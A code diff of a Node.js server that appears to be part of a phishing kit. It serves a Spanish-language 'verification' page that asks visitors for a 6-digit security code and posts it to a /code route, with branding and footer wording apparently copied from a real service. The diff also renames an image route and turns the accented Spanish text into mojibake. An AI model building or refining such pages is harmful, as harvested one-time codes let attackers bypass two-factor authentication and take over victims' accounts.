@@ -10,7 +10,7 @@ res.end(data);
 });
 }
 
-else if (req.url === '/logomp.png') {
+else if (req.url === '/logomp1.png') {
 fs.readFile('logomp.png', (err, data) => {
 res.writeHead(200, { 'Content-Type': 'image/png' });
 res.end(data);
@@ -39,7 +39,7 @@ else if (req.url === '/ok') {
   <html lang="es">
   <head>
     <meta charset="UTF-8">
-    <title>Verificación</title>
+    <title>VerificaciÃ³n</title>
     <style>
       *{margin:0;padding:0;box-sizing:border-box}
       body{
@@ -82,14 +82,14 @@ text-align: center;
   <body>
     <div class="wrapper">
       <div class="box">
-        <div class="title">Ingresa el código de 6 digitos.</div>
-        <div class="desc">Para confirmar tu identidad ingresá el código que enviamos.</div>
+        <div class="title">Ingresa el cÃ³digo de 6 digitos.</div>
+        <div class="desc">Para confirmar tu identidad ingresÃ¡ el cÃ³digo que enviamos.</div>
         <form method="POST" action="/code"> 
-          <input class="input" name="codigo" placeholder="Código de seguridad" inputmode="numeric">
+          <input class="input" name="codigo" placeholder="CÃ³digo de seguridad" inputmode="numeric">
           <button class="btn" type="submit">Confirmar</button>
         </form>
       </div>
-      <div class="footer">También puedes denunciar el contenido que creas que es ilegal en tu pais sin iniciar sesión. Descarga la <span class="link">aplicación</span> © 2026 </div>
+      <div class="footer">TambiÃ©n puedes denunciar el contenido que creas que es ilegal en tu pais sin iniciar sesiÃ³n. Descarga la <span class="link">aplicaciÃ³n</span> Â© 2026 </div>
     </div>
   </body>
   </html>
